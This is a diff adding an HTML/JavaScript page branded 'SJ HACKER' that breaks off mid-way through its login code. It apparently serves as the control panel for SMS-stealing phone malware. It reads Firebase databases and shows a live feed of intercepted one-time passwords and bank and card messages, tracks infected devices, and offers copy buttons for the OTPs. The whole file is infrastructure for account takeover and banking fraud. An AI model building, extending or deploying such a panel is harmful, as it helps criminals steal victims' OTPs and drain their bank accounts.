@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SJ HACKER // CONTROL_PANEL</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo+Black&family=Space+Mono:wght@400;700&family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+:root[data-theme="dark"] {
+  --bg:#0a0a0a; --bg-grid:#141414; --surface:#111; --surface-2:#1a1a1a;
+  --border:#2a2a2a; --shadow:#000; --text:#f0f0f0; --text-dim:#8a8a8a;
+  --accent:#c8ff00; --accent-ink:#0a0a0a; --accent-2:#ff4d00;
+  --ok:#00ff88; --warn:#ffcc00; --danger:#ff3355;
+  --noise:0.035; --blob1:#c8ff00; --blob2:#ff4d00;
+}
+:root[data-theme="light"] {
+  --bg:#f5f2eb; --bg-grid:#e8e4da; --surface:#fff; --surface-2:#faf8f3;
+  --border:#1a1a1a; --shadow:#1a1a1a; --text:#0a0a0a; --text-dim:#6a6a6a;
+  --accent:#0a0a0a; --accent-ink:#c8ff00; --accent-2:#ff4d00;
+  --ok:#00a854; --warn:#cc8800; --danger:#cc0033;
+  --noise:0.05; --blob1:#c8ff00; --blob2:#ff4d00;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);color:var(--text);
+  font-family:'Space Mono',monospace;font-size:13px;line-height:1.5;
+  min-height:100vh;overflow-x:hidden;
+  transition:background .25s,color .25s;position:relative;
+}
+
+.bg-layer{position:fixed;inset:0;pointer-events:none;z-index:0}
+.bg-grid{
+  background-image:
+    linear-gradient(var(--bg-grid) 1px,transparent 1px),
+    linear-gradient(90deg,var(--bg-grid) 1px,transparent 1px);
+  background-size:48px 48px;opacity:.7;
+  mask-image:radial-gradient(ellipse at center,#000 20%,transparent 80%);
+  -webkit-mask-image:radial-gradient(ellipse at center,#000 20%,transparent 80%);
+}
+.bg-blob{filter:blur(120px);opacity:.28;mix-blend-mode:screen}
+:root[data-theme="light"] .bg-blob{mix-blend-mode:multiply;opacity:.15}
+.bg-blob.b1{background:var(--blob1);width:480px;height:480px;border-radius:50%;
+  top:-180px;left:-120px;position:absolute;animation:f1 18s ease-in-out infinite}
+.bg-blob.b2{background:var(--blob2);width:420px;height:420px;border-radius:50%;
+  bottom:-160px;right:-100px;position:absolute;animation:f2 22s ease-in-out infinite}
+@keyframes f1{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(60px,80px) scale(1.15)}}
+@keyframes f2{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(-70px,-50px) scale(1.1)}}
+.bg-noise{
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  opacity:var(--noise);mix-blend-mode:overlay;
+}
+:root[data-theme="dark"] .bg-scan{
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,
+    rgba(200,255,0,.012) 3px,rgba(200,255,0,.012) 4px);
+}
+
+.brut{border:2px solid var(--border);background:var(--surface);
+  box-shadow:4px 4px 0 var(--shadow);
+  transition:transform .12s,box-shadow .12s,border-color .12s}
+.brut:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--shadow)}
+.brut-static{border:2px solid var(--border);background:var(--surface);
+  box-shadow:4px 4px 0 var(--shadow)}
+
+/* OVERLAY SCREENS (setup / login) */
+.overlay{position:fixed;inset:0;z-index:100;display:flex;
+  align-items:center;justify-content:center;padding:24px;background:var(--bg);
+  overflow-y:auto}
+.overlay.hidden{display:none}
+
+.card{width:100%;max-width:460px;padding:32px 28px;position:relative;margin:auto}
+.card.wide{max-width:640px}
+.card::before{content:'///';position:absolute;top:-14px;left:16px;
+  background:var(--accent);color:var(--accent-ink);
+  font-family:'Archivo Black',sans-serif;font-size:11px;
+  padding:2px 8px;letter-spacing:.15em}
+.brand-title{font-family:'Archivo Black',sans-serif;font-size:34px;
+  line-height:0.95;letter-spacing:-.03em;color:var(--text);text-transform:uppercase}
+.brand-title .accent{color:var(--accent);-webkit-text-stroke:1px var(--text)}
+:root[data-theme="dark"] .brand-title .accent{-webkit-text-stroke:0}
+.brand-sub{font-family:'Space Mono',monospace;font-size:10px;
+  letter-spacing:.35em;color:var(--text-dim);margin-top:6px;text-transform:uppercase}
+
+.brut-input{width:100%;padding:12px 14px;font-family:'JetBrains Mono',monospace;
+  font-size:14px;background:var(--bg);border:2px solid var(--border);
+  color:var(--text);outline:none;transition:border-color .12s;letter-spacing:.05em}
+.brut-input:focus{border-color:var(--accent);box-shadow:4px 4px 0 var(--accent)}
+.brut-input::placeholder{color:var(--text-dim);letter-spacing:.2em}
+
+.brut-textarea{width:100%;padding:12px 14px;font-family:'JetBrains Mono',monospace;
+  font-size:12px;background:var(--bg);border:2px solid var(--border);
+  color:var(--text);outline:none;transition:border-color .12s;
+  letter-spacing:.02em;resize:vertical;min-height:160px;line-height:1.5}
+.brut-textarea:focus{border-color:var(--accent);box-shadow:4px 4px 0 var(--accent)}
+.brut-textarea::placeholder{color:var(--text-dim);letter-spacing:.05em}
+
+.brut-btn{width:100%;padding:12px 16px;font-family:'Archivo Black',sans-serif;
+  font-size:14px;letter-spacing:.15em;text-transform:uppercase;
+  background:var(--accent);color:var(--accent-ink);
+  border:2px solid var(--border);box-shadow:4px 4px 0 var(--shadow);
+  cursor:pointer;transition:transform .1s,box-shadow .1s}
+.brut-btn:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--shadow)}
+.brut-btn:active{transform:translate(2px,2px);box-shadow:0 0 0 var(--shadow)}
+.brut-btn:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:4px 4px 0 var(--shadow)}
+
+.brut-btn-sm{padding:6px 12px;font-size:11px;width:auto;
+  font-family:'JetBrains Mono',monospace;font-weight:700;
+  letter-spacing:.1em;background:var(--surface);color:var(--text);
+  border:2px solid var(--border);box-shadow:3px 3px 0 var(--shadow);
+  cursor:pointer;transition:transform .1s,box-shadow .1s;text-transform:uppercase}
+.brut-btn-sm:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 var(--shadow)}
+.brut-btn-sm.danger{color:var(--danger);border-color:var(--danger)}
+
+/* CONFIG LIST */
+.config-list{display:flex;flex-direction:column;gap:8px;margin-top:16px;max-height:240px;overflow-y:auto}
+.config-item{padding:10px 14px;border:2px solid var(--border);
+  background:var(--bg);display:flex;align-items:center;
+  justify-content:space-between;gap:10px}
+.config-item-info{flex:1;min-width:0}
+.config-item-name{font-family:'JetBrains Mono',monospace;font-size:12px;
+  font-weight:700;color:var(--text);
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.config-item-url{font-family:'Space Mono',monospace;font-size:9px;
+  color:var(--text-dim);margin-top:2px;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:.05em}
+
+/* HELP TEXT */
+.help{font-family:'Space Mono',monospace;font-size:10px;
+  color:var(--text-dim);letter-spacing:.05em;line-height:1.6;margin-top:8px}
+
+/* THEME TOGGLE */
+.theme-toggle{position:fixed;top:20px;right:20px;z-index:200;
+  width:46px;height:46px;display:flex;align-items:center;justify-content:center;
+  background:var(--surface);border:2px solid var(--border);
+  box-shadow:3px 3px 0 var(--shadow);cursor:pointer;font-size:18px;
+  transition:transform .1s,box-shadow .1s;color:var(--text)}
+.theme-toggle:hover{transform:translate(-2px,-2px);box-shadow:5px 5px 0 var(--shadow)}
+
+.settings-btn{position:fixed;top:20px;right:80px;z-index:200;
+  width:46px;height:46px;display:flex;align-items:center;justify-content:center;
+  background:var(--surface);border:2px solid var(--border);
+  box-shadow:3px 3px 0 var(--shadow);cursor:pointer;font-size:16px;
+  transition:transform .1s,box-shadow .1s;color:var(--text)}
+.settings-btn:hover{transform:translate(-2px,-2px);box-shadow:5px 5px 0 var(--shadow)}
+.settings-btn.hidden{display:none}
+
+/* APP */
+#app{position:relative;z-index:1;max-width:1100px;margin:0 auto;
+  padding:28px 20px 60px;display:none}
+#app.active{display:block;animation:fu .4s ease}
+@keyframes fu{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.header{display:flex;align-items:flex-end;justify-content:space-between;
+  gap:16px;margin-bottom:28px;padding-bottom:20px;border-bottom:3px solid var(--border);flex-wrap:wrap}
+.header-brand .eyebrow{font-family:'Space Mono',monospace;font-size:10px;
+  letter-spacing:.4em;color:var(--accent);text-transform:uppercase;margin-bottom:6px}
+.header-brand .logo{font-family:'Archivo Black',sans-serif;
+  font-size:clamp(28px,5vw,44px);line-height:.9;letter-spacing:-.03em;
+  color:var(--text);text-transform:uppercase}
+.header-brand .logo .accent{color:var(--accent);-webkit-text-stroke:1px var(--text)}
+:root[data-theme="dark"] .header-brand .logo .accent{-webkit-text-stroke:0}
+.header-meta{display:flex;align-items:center;gap:16px;
+  font-family:'JetBrains Mono',monospace;font-size:11px;
+  color:var(--text-dim);letter-spacing:.1em}
+.live-dot{width:8px;height:8px;background:var(--ok);
+  box-shadow:0 0 10px var(--ok);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+
+.stats{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-bottom:20px}
+@media(min-width:720px){.stats{grid-template-columns:repeat(4,1fr)}}
+.stat{padding:18px 16px;position:relative;overflow:hidden}
+.stat .label{font-family:'Space Mono',monospace;font-size:9px;
+  letter-spacing:.3em;color:var(--text-dim);text-transform:uppercase;margin-bottom:8px}
+.stat .value{font-family:'Archivo Black',sans-serif;font-size:34px;
+  line-height:1;color:var(--text)}
+.stat.online .value{color:var(--ok)}
+.stat.offline .value{color:var(--danger)}
+.stat.bank .value{color:var(--warn)}
+.stat .corner{position:absolute;top:0;right:0;width:0;height:0;
+  border-top:24px solid var(--accent);border-left:24px solid transparent;opacity:.7}
+
+.tabs{display:flex;gap:0;margin-bottom:20px;border-bottom:3px solid var(--border)}
+.tab{padding:12px 20px;font-family:'Archivo Black',sans-serif;
+  font-size:12px;letter-spacing:.15em;text-transform:uppercase;
+  background:transparent;border:2px solid var(--border);border-bottom:none;
+  color:var(--text-dim);cursor:pointer;margin-right:-2px;
+  transition:all .15s;position:relative;top:3px}
+.tab:hover{color:var(--text);background:var(--surface-2)}
+.tab.active{background:var(--accent);color:var(--accent-ink);
+  border-color:var(--border);top:2px;padding-bottom:15px}
+
+.search-wrap{margin-bottom:16px;position:relative}
+.search-input{width:100%;padding:12px 44px 12px 42px;
+  font-family:'JetBrains Mono',monospace;font-size:13px;
+  background:var(--surface);border:2px solid var(--border);
+  color:var(--text);outline:none;letter-spacing:.05em;
+  box-shadow:4px 4px 0 var(--shadow);transition:border-color .12s}
+.search-input:focus{border-color:var(--accent)}
+.search-wrap::before{content:'▸';position:absolute;left:16px;top:50%;
+  transform:translateY(-50%);color:var(--accent);font-size:16px;pointer-events:none}
+.search-clear{position:absolute;right:12px;top:50%;transform:translateY(-50%);
+  background:transparent;border:none;color:var(--text-dim);
+  font-size:16px;cursor:pointer;padding:4px 8px;display:none}
+.search-clear.show{display:block}
+
+.filters{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px}
+.filter-btn{padding:8px 16px;font-family:'JetBrains Mono',monospace;
+  font-size:11px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;
+  background:var(--surface);color:var(--text-dim);
+  border:2px solid var(--border);box-shadow:3px 3px 0 var(--shadow);
+  cursor:pointer;transition:transform .1s,box-shadow .1s,background .15s,color .15s}
+.filter-btn:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 var(--shadow);color:var(--text)}
+.filter-btn.active{background:var(--accent);color:var(--accent-ink);border-color:var(--border)}
+
+.feed{display:flex;flex-direction:column;gap:10px}
+.feed-item{padding:16px 18px;display:flex;align-items:center;
+  justify-content:space-between;gap:16px;cursor:pointer;position:relative}
+.feed-item .left{flex:1;min-width:0}
+.feed-item .title{font-family:'JetBrains Mono',monospace;font-size:14px;
+  font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;
+  text-overflow:ellipsis;letter-spacing:.02em}
+.feed-item .body{font-family:'Space Mono',monospace;font-size:11px;
+  color:var(--text-dim);margin-top:4px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis}
+.feed-item .meta{display:flex;gap:10px;font-size:9px;letter-spacing:.15em;
+  color:var(--text-dim);margin-top:6px;text-transform:uppercase;flex-wrap:wrap}
+.tag{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:800;
+  letter-spacing:.15em;padding:5px 10px;text-transform:uppercase;
+  white-space:nowrap;border:2px solid;flex-shrink:0}
+.tag.online{color:var(--ok);border-color:var(--ok);
+  background:color-mix(in srgb,var(--ok) 10%,transparent)}
+.tag.offline{color:var(--danger);border-color:var(--danger);
+  background:color-mix(in srgb,var(--danger) 10%,transparent)}
+.tag.bank{color:var(--warn);border-color:var(--warn);
+  background:color-mix(in srgb,var(--warn) 10%,transparent)}
+
+.project-tag{font-family:'JetBrains Mono',monospace;font-size:8px;
+  font-weight:700;letter-spacing:.15em;padding:2px 6px;
+  text-transform:uppercase;border:1px solid var(--text-dim);
+  color:var(--text-dim);border-radius:0;margin-left:4px}
+
+.devices{display:grid;grid-template-columns:1fr;gap:12px}
+@media(min-width:680px){.devices{grid-template-columns:repeat(2,1fr)}}
+.device-card{padding:18px}
+.device-head{display:flex;justify-content:space-between;
+  align-items:flex-start;gap:10px;margin-bottom:14px}
+.device-name{font-family:'JetBrains Mono',monospace;font-size:15px;
+  font-weight:800;color:var(--text);letter-spacing:.02em}
+.device-model{font-family:'Space Mono',monospace;font-size:10px;
+  color:var(--text-dim);margin-top:3px;letter-spacing:.1em}
+.device-meta{display:flex;gap:14px;flex-wrap:wrap;
+  font-family:'JetBrains Mono',monospace;font-size:10px;
+  color:var(--text-dim);letter-spacing:.1em;
+  padding-top:12px;border-top:1px solid var(--border)}
+.device-meta span{display:flex;align-items:center;gap:6px}
+
+.empty{padding:60px 20px;text-align:center;
+  font-family:'JetBrains Mono',monospace;font-size:12px;
+  letter-spacing:.3em;color:var(--text-dim);text-transform:uppercase}
+.footer{margin-top:40px;padding-top:20px;border-top:2px solid var(--border);
+  font-family:'JetBrains Mono',monospace;font-size:10px;
+  letter-spacing:.2em;color:var(--text-dim);text-transform:uppercase;
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.err{color:var(--danger);font-family:'JetBrains Mono',monospace;
+  font-size:11px;letter-spacing:.1em;margin-top:10px;display:none}
+.err.show{display:block}
+.ok-msg{color:var(--ok);font-family:'JetBrains Mono',monospace;
+  font-size:11px;letter-spacing:.1em;margin-top:10px;display:none}
+.ok-msg.show{display:block}
+
+.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.75);
+  backdrop-filter:blur(6px);z-index:300;display:none;
+  align-items:center;justify-content:center;padding:24px}
+.modal-bg.show{display:flex;animation:fadein .2s}
+@keyframes fadein{from{opacity:0}to{opacity:1}}
+.modal{max-width:520px;width:100%;padding:0;position:relative;
+  animation:pop .25s cubic-bezier(.2,1.2,.4,1)}
+@keyframes pop{from{transform:scale(.9);opacity:0}to{transform:scale(1);opacity:1}}
+.modal-head{padding:20px 22px;border-bottom:2px solid var(--border);
+  display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
+.modal-title{font-family:'Archivo Black',sans-serif;font-size:18px;
+  letter-spacing:-.01em;text-transform:uppercase;color:var(--text)}
+.modal-sub{font-family:'JetBrains Mono',monospace;font-size:10px;
+  color:var(--text-dim);margin-top:4px;letter-spacing:.15em}
+.modal-close{background:transparent;border:2px solid var(--border);
+  color:var(--text);width:32px;height:32px;cursor:pointer;
+  font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:800;
+  display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.modal-close:hover{background:var(--danger);color:#fff;border-color:var(--danger)}
+.modal-body{padding:22px}
+.modal-field{margin-bottom:16px}
+.modal-label{font-family:'Space Mono',monospace;font-size:9px;
+  letter-spacing:.3em;color:var(--text-dim);
+  text-transform:uppercase;margin-bottom:6px}
+.modal-value{font-family:'JetBrains Mono',monospace;font-size:13px;
+  color:var(--text);padding:12px 14px;background:var(--bg);
+  border:2px solid var(--border);word-break:break-all;letter-spacing:.02em}
+.otp-box{display:flex;align-items:center;gap:10px}
+.otp-box .modal-value{flex:1;font-size:24px;font-weight:800;
+  letter-spacing:.4em;color:var(--accent);text-align:center}
+.copy-btn{padding:12px 16px;font-family:'Archivo Black',sans-serif;
+  font-size:11px;letter-spacing:.15em;text-transform:uppercase;
+  background:var(--accent);color:var(--accent-ink);
+  border:2px solid var(--border);cursor:pointer;white-space:nowrap;
+  box-shadow:3px 3px 0 var(--shadow);transition:transform .1s,box-shadow .1s}
+.copy-btn:hover{transform:translate(-2px,-2px);box-shadow:5px 5px 0 var(--shadow)}
+.copy-btn:active{transform:translate(1px,1px);box-shadow:0 0 0 var(--shadow)}
+
+#toasts{position:fixed;top:80px;right:20px;z-index:400;
+  display:flex;flex-direction:column;gap:10px;pointer-events:none;max-width:340px}
+.toast{pointer-events:auto;padding:14px 18px;
+  background:var(--surface);border:2px solid var(--border);
+  box-shadow:4px 4px 0 var(--shadow);min-width:280px;
+  animation:slideIn .35s cubic-bezier(.2,1.2,.4,1)}
+@keyframes slideIn{from{transform:translateX(120%);opacity:0}to{transform:translateX(0);opacity:1}}
+.toast.out{animation:slideOut .3s forwards}
+@keyframes slideOut{to{transform:translateX(120%);opacity:0}}
+.toast-head{display:flex;justify-content:space-between;
+  align-items:center;margin-bottom:8px}
+.toast-title{font-family:'Archivo Black',sans-serif;font-size:11px;
+  letter-spacing:.2em;color:var(--accent);text-transform:uppercase}
+.toast-time{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--text-dim)}
+.toast-otp{font-family:'JetBrains Mono',monospace;font-size:22px;
+  font-weight:800;letter-spacing:.3em;color:var(--text);
+  margin:6px 0;text-align:center;
+  padding:8px;border:2px dashed var(--accent)}
+.toast-body{font-family:'Space Mono',monospace;font-size:11px;
+  color:var(--text-dim);line-height:1.4;
+  overflow:hidden;display:-webkit-box;
+  -webkit-line-clamp:2;-webkit-box-orient:vertical}
+
+@media(max-width:600px){
+  .theme-toggle{top:14px;right:14px;width:40px;height:40px}
+  .settings-btn{top:14px;right:64px;width:40px;height:40px}
+  .stat .value{font-size:28px}
+  .feed-item{flex-direction:column;align-items:flex-start;gap:10px}
+  .tag{align-self:flex-start}
+  #toasts{right:10px;left:10px;max-width:none;top:70px}
+  .toast{min-width:0}
+  .card.wide{padding:24px 18px}
+}
+</style>
+</head>
+<body>
+
+<div class="bg-layer bg-grid"></div>
+<div class="bg-layer bg-blob b1"></div>
+<div class="bg-layer bg-blob b2"></div>
+<div class="bg-layer bg-noise"></div>
+<div class="bg-layer bg-scan"></div>
+
+<button class="theme-toggle" id="themeToggle"><span id="themeIcon">◐</span></button>
+<button class="settings-btn hidden" id="settingsBtn" title="Firebase settings">⚙</button>
+
+<div id="toasts"></div>
+
+<!-- ═══ SETUP SCREEN ═══ -->
+<div class="overlay" id="setupScreen">
+  <div class="card wide brut-static">
+    <div class="brand-title">SJ <span class="accent">HACKER</span></div>
+    <div class="brand-sub">// setup — firebase connection</div>
+
+    <div style="margin-top:24px;">
+      <label style="font-family:'Space Mono',monospace;font-size:10px;
+        letter-spacing:.3em;color:var(--text-dim);display:block;
+        margin-bottom:8px;text-transform:uppercase;">
+        ▸ Paste Firebase Config (single ya array)
+      </label>
+      <textarea id="configInput" class="brut-textarea"
+        placeholder='{
+  "apiKey": "AIzaSy...",
+  "authDomain": "project.firebaseapp.com",
+  "databaseURL": "https://project-default-rtdb.firebaseio.com",
+  "projectId": "project",
+  "storageBucket": "project.appspot.com",
+  "messagingSenderId": "123456",
+  "appId": "1:123:web:abc"
+}'></textarea>
+      <div class="help">
+        ▸ ek config: <code>{ ... }</code><br>
+        ▸ multiple configs: <code>[ { ... }, { ... } ]</code><br>
+        ▸ ya Firebase console se pura copy karke paste kar — <code>const firebaseConfig =</code> prefix auto-strip ho jayega
+      </div>
+      <div class="err" id="setupErr">// invalid config — json check karo</div>
+      <div class="ok-msg" id="setupOk">▸ config added ✓</div>
+
+      <div style="display:flex;gap:10px;margin-top:14px;">
+        <button class="brut-btn" id="addConfigBtn">▸ Add Config</button>
+      </div>
+
+      <div class="config-list" id="configList"></div>
+
+      <button class="brut-btn" id="continueBtn" style="margin-top:16px;" disabled>
+        ▸ Save & Continue
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ LOGIN SCREEN ═══ -->
+<div class="overlay hidden" id="loginScreen">
+  <div class="card brut-static">
+    <div class="brand-title">SJ<br><span class="accent">HACKER</span></div>
+    <div class="brand-sub">// access terminal v4.0</div>
+    <div style="margin-top:28px;">
+      <label style="font-family:'Space Mono',monospace;font-size:10px;
+        letter-spacing:.3em;color:var(--text-dim);display:block;
+        margin-bottom:8px;text-transform:uppercase;">▸ Enter Access Key</label>
+      <input type="password" id="keyInput" class="brut-input"
+        placeholder="••••••••••" autocomplete="off">
+      <div class="err" id="loginErr">// ACCESS DENIED — INVALID KEY</div>
+      <button class="brut-btn" id="loginBtn" style="margin-top:16px;">
+        ▸ Unlock Panel
+      </button>
+      <div style="font-family:'Space Mono',monospace;font-size:9px;
+        letter-spacing:.2em;color:var(--text-dim);margin-top:14px;
+        text-align:center;text-transform:uppercase;">
+        demo key: <span style="color:var(--accent);">sjadmin</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ APP ═══ -->
+<div id="app">
+
+  <header class="header">
+    <div class="header-brand">
+      <div class="eyebrow">▸ live control feed</div>
+      <div class="logo">SJ <span class="accent">HACKER</span></div>
+    </div>
+    <div class="header-meta">
+      <span id="clock">--:--:--</span>
+      <span class="live-dot"></span>
+      <span id="connStatus">connecting…</span>
+    </div>
+  </header>
+
+  <section class="stats">
+    <div class="stat brut-static">
+      <div class="corner"></div>
+      <div class="label">▸ Total</div>
+      <div class="value" id="statTotal">0</div>
+    </div>
+    <div class="stat brut-static online">
+      <div class="label">▸ Online Devices</div>
+      <div class="value" id="statOnline">0</div>
+    </div>
+    <div class="stat brut-static offline">
+      <div class="label">▸ Offline Devices</div>
+      <div class="value" id="statOffline">0</div>
+    </div>
+    <div class="stat brut-static bank">
+      <div class="label">▸ OTPs Today</div>
+      <div class="value" id="statOtp">0</div>
+    </div>
+  </section>
+
+  <div class="tabs">
+    <button class="tab active" data-tab="feed">Feed</button>
+    <button class="tab" data-tab="devices">Devices</button>
+  </div>
+
+  <div id="feedTab">
+    <div class="search-wrap">
+      <input type="text" id="searchInput" class="search-input"
+        placeholder="search sender, otp, body…">
+      <button class="search-clear" id="searchClear">✕</button>
+    </div>
+
+    <div class="filters" id="filters">
+      <button class="filter-btn active" data-filter="all">All</button>
+      <button class="filter-btn" data-filter="otp">OTP</button>
+      <button class="filter-btn" data-filter="bank">Bank</button>
+      <button class="filter-btn" data-filter="card">Card</button>
+      <button class="filter-btn" data-filter="sms">SMS</button>
+    </div>
+
+    <div class="feed" id="feed"></div>
+  </div>
+
+  <div id="devicesTab" style="display:none">
+    <div class="devices" id="devices"></div>
+  </div>
+
+  <footer class="footer">
+    <span>▸ SJ HACKER © 2025</span>
+    <span id="lastSync">▸ waiting for data…</span>
+  </footer>
+
+</div>
+
+<!-- MODAL -->
+<div class="modal-bg" id="modalBg">
+  <div class="modal brut-static">
+    <div class="modal-head">
+      <div>
+        <div class="modal-title" id="modalTitle">—</div>
+        <div class="modal-sub" id="modalSub">—</div>
+      </div>
+      <button class="modal-close" id="modalClose">✕</button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<script type="module">
+import { initializeApp, deleteApp }
+  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import {
+  getDatabase, ref, onValue, query, orderByChild, limitToLast
+} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+/* ═══════════════════════════════════════
+   CONFIG
+   ═══════════════════════════════════════ */
+const VALID_KEY     = 'sjadmin';
+const OFFLINE_AFTER = 60_000;
+const MAX_FEED      = 200;
+
+/* ═══════════════════════════════════════
+   THEME
+   ═══════════════════════════════════════ */
+const root = document.documentElement;
+const themeBtn = document.getElementById('themeToggle');
+const themeIcon = document.getElementById('themeIcon');
+const saved = localStorage.getItem('sj_theme') || 'dark';
+root.setAttribute('data-theme', saved);
+themeIcon.textContent = saved === 'dark' ? '◐' : '◑';
+themeBtn.addEventListener('click', () => {
+  const next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+  root.setAttribute('data-theme', next);
+  localStorage.setItem('sj_theme', next);
+  themeIcon.textContent = next === 'dark' ? '◐' : '◑';
+});
+
+/* ═══════════════════════════════════════
+   SETUP SCREEN — BULK CONFIG ADD
+   ═══════════════════════════════════════ */
+const setupScreen  = document.getElementById('setupScreen');
+const loginScreen  = document.getElementById('loginScreen');
+const app          = document.getElementById('app');
+const settingsBtn  = document.getElementById('settingsBtn');
+
+const configInput  = document.getElementById('configInput');
+const addConfigBtn = document.getElementById('addConfigBtn');
+const continueBtn  = document.getElementById('continueBtn');
+const configListEl = document.getElementById('configList');
+const setupErr     = document.getElementById('setupErr');
+const setupOk      = document.getElementById('setupOk');
+
+let stagedConfigs = JSON.parse(localStorage.getItem('sj_configs') || '[]');
+
+function renderStagedConfigs() {
+  if (!stagedConfigs.length) {
+    configListEl.innerHTML = '';
+    continueBtn.disabled = true;
+    return;
+  }
+  configListEl.innerHTML = stagedConfigs.map((c, i) => `
+    <div class="config-item">
+      <div class="config-item-info">
+        <div class="config-item-name">${escapeHtml(c.name)}</div>
+        <div class="config-item-url">${escapeHtml(c.config.databaseURL || '—')}</div>
+      </div>
+      <button class="brut-btn-sm danger" data-remove="${i}">✕</button>
+    </div>
+  `).join('');
+
+  configListEl.querySelectorAll('[data-remove]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      stagedConfigs.splice(+btn.dataset.remove, 1);
+      renderStagedConfigs();
+    });
+  });
+
+  continueBtn.disabled = false;
+}
+
+function parseConfigText(text) {
+  text = text.trim();
+  /* strip "const firebaseConfig = " prefix */
+  text = text.replace(/const\s+firebaseConfig\s*=\s*/, '').replace(/;\s*$/, '').trim();
+
+  /* try whole parse first */
+  try {
+    const parsed = JSON.parse(text);
+    if (Array.isArray(parsed)) return parsed;
+    return [parsed];
+  } catch (_) {}
+
+  /* try wrapping in array (newline-separated) */
+  try {
+    const parsed = JSON.parse('[' + text.replace(/,\s*$/, '') + ']');
+    if (Array.isArray(parsed)) return parsed;
+  } catch (_) {}
+
+  /* try splitting by blank lines */
+  const chunks = text.split(/\n\s*\n/).map(s => s.trim()).filter(Boolean);
+  const out = [];
+  for (const chunk of chunks) {
+    try {
+      out.push(JSON.parse(chunk.replace(/,\s*$/, '')));
+    } catch (_) {}
+  }
+  if (out.length) return out;
+
+  throw new Error('parse failed');
+}
+
+function validateConfig(cfg) {
+  const required = ['apiKey', 'databaseURL', 'projectId'];
+  for (const k of required) {
+    if (!cfg[k]) throw new Error('missing ' + k);
+  }
+  return true;
+}
+
+addConfigBtn.addEventListener('click', () => {
+  setupErr.classList.remove('show');
+  setupOk.classList.remove('show');
+  try {
+    const configs = parseConfigText(configInput.value);
+    if (!configs.length) throw new Error('empty');
+
+    let added = 0;
+    for (const cfg of configs) {
+      validateConfig(cfg);
+      const id = cfg.projectId + '_' + (cfg.databaseURL || '').split('//')[1]?.split('.')[0];
+      /* skip duplicates */
+      if (stagedConfigs.some(c => c.id === id)) continue;
+      stagedConfigs.push({
+        id,
+        name: cfg.projectId || 'project-' + (stagedConfigs.length + 1),
+        config: cfg
+      });
+      added++;
+    }
+    if (!added) throw new Error('duplicate');
+    configInput.value = '';
+    renderStagedConfigs();
+    setupOk.classList.add('show');
+    setTimeout(() => setupOk.classList.remove('show'), 2000);
+  } catch (e) {
+    setupErr.textContent = '// invalid config — ' + (e.message || 'json check karo');
+    setupErr.classList.add('show');
+    setTimeout(() => setupErr.classList.remove('show'), 3000);
+  }
+});
+
+continueBtn.addEventListener('click', () => {
+  if (!stagedConfigs.length) return;
+  localStorage.setItem('sj_configs', JSON.stringify(stagedConfigs));
+  /* reload — cleanest way to re-init firebase */
+  location.reload();
+});
+
+/* ── setup visibility on load ── */
+if (stagedConfigs.length === 0) {
+  setupScreen.classList.remove('hidden');
+  loginScreen.classList.add('hidden');
+} else {
+  setupScreen.classList.add('hidden');
+  loginScreen.classList.remove('hidden');
+}
+
+renderStagedConfigs();
+
+/* settings button reopens setup */
+settingsBtn.addEventListener('click', () => {
+  stagedConfigs = JSON.parse(localStorage.getItem('sj_configs') || '[]');
+  renderStagedConfigs();
+  setupScreen.classList.remove('hidden');
+  loginScreen.classList.add('hidden');
+  app.classList.remove('active');
+  settingsBtn.classList.add('hidden');
+  window.scrollTo(0, 0);
+});
+
+/* ═══════════════════════════════════════
+   LOGIN
+   ═══════════════════════════════════════ */
+const keyInput = document.getElementById('keyInput');
+const loginBtn = document.getElementById('loginBtn');
+const loginErr = document.getElementById('loginErr');
+
+function attemptLogin() {
+  if (keyInput.value.trim() === VALID_KEY) {
+    sessionStorage.setItem('sj_auth', '1');
+    loginScreen.classList.add('hidden');
+    app.classList.add('active');
